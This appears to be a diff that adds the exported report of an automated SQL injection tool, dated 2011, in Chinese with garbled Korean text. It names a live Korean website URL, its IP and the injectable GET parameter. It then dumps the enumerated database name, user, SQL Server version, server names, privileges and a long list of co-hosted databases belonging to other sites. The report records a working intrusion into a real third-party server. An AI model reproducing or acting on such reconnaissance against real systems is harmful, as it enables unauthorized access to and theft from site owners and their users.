@@ -1,0 +1,152 @@
+■漏洞信息:============================================================
+ ·URL:http://pipls.co.kr/bbs/content.asp?page=11&query=&id=942&siteid=data_korea
+ ·页面标题：舅鸥府辫摹啊 酒聪扼 醚阿辫摹
+
+ ·参数:page=11&query=&id=942&siteid=data_korea
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.236.177.11
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 07:07:24 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 5985
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDCSDTRRSS=AIECBMKALPKNPANOBBHLHJGA; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：pipls
+- 用户名：pipls
+- 版本：Microsoft SQL Server 2008 (SP1) - 10.0.2531.0 (Intel X86) 
+	Mar 29 2009 10:27:29 
+	Copyright (c) 1988-2008 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 &lt;X86&gt; (Build 3790: Service Pack 2)
+
+- 服务器名：TSWIN2
+- 服务名：MSSQLSERVER
+- 系统用户名：pipls
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master		
+tempdb		
+model		
+365eye		
+365eye		
+amarunsb		
+anistory21		
+anycallbell		
+ASPState		
+bigfield		
+bsmarathon		
+byschool_db		
+cancer		
+charmdoctor		
+cheonghakkids		
+chungsancoupling		
+compomall		
+daesuk		
+davidcom		
+dbs21		
+djhp_db		
+dmcall		
+doctoroh		
+dongkyemarathon		
+doohee		
+doonam		
+doosanf		
+einline		
+election		
+enamuro		
+finecity_db		
+fmgagu		
+gagu2		
+gangster		
+gprun		
+gurorun		
+haniltechno		
+hanjin		
+hansungmetal		
+hansungmetal_erp		
+happyi365		
+happytrailrun		
+hseng		
+hyosunglife		
+ibsa		
+ichyanggyo		
+igcn		
+ilovepcclub		
+imgagong		
+inhagi		
+int-tissuebank		
+ion		
+itgreen		
+itss		
+jaechub		
+jiwooelec		
+jongrosa		
+joongangchangho		
+juno_db		
+kapca		
+katb		
+khope		
+kkbank		
+korea3s		
+kosca35		
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.х???篘?榘?	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Internet Information Services	runnable	TSWIN1	1340	SELECT		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+TSWIN2	SQL Server	SQLOLEDB	TSWIN2		TSWIN2	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+
+
